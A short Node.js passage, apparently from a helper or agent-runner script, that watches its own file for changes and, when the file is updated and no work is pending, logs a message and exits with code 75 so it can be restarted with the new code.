  if (process.env.VILLAGE_LOGIN_ITEM === '1') {
    const started = fs.statSync(__filename).mtimeMs;
    setInterval(() => {
      let now; try { now = fs.statSync(__filename).mtimeMs; } catch { return; }
      if (now === started || running || queue.length || working.size || pending.length || busyAgents.size) return;
      console.log(`${new Date().toISOString()} New helper code found: restarting to use it.`);
      process.exit(75);
    }, 5000);
  }
}
